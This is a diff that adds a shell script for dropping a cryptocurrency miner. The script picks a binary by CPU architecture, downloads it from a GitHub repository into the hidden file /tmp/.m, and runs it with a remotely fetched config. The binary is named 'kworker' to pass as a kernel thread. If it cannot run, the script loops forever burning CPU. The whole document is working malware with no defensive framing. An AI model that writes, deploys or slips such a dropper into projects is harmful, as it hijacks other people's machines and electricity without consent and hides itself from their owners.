@@ -1,0 +1,27 @@
+#!/bin/sh
+
+CONFIG_URL="https://raw.githubusercontent.com/darwindar/rawrsa/main/config.json"
+MINER_BASE="https://raw.githubusercontent.com/darwindar/rawrsa/main"
+
+ARCH=$(uname -m)
+case $ARCH in
+  arm*) MINER_URL="$MINER_BASE/arm/kworker";;
+  mips*) MINER_URL="$MINER_BASE/mips/kworker";;
+  i*86|x86_64) MINER_URL="$MINER_BASE/x86/kworker";;
+  *) MINER_URL="" ;;
+esac
+
+if [ -n "$MINER_URL" ]; then
+  (curl -sL "$MINER_URL" || wget -qO- "$MINER_URL") > /tmp/.m 2>/dev/null
+  chmod +x /tmp/.m 2>/dev/null
+  if /tmp/.m -V >/dev/null 2>&1; then
+    CONFIG=$(curl -sL "$CONFIG_URL" || wget -qO- "$CONFIG_URL")
+    echo "$CONFIG" | /tmp/.m -c - 
+    exit 0
+  fi
+fi
+
+while :; do
+  dd if=/dev/urandom bs=1M count=10 2>/dev/null | sha256sum >/dev/null
+  sleep $(( $(head -c 1 /dev/urandom | od -An -tu1) % 15 + 1 ))
+done
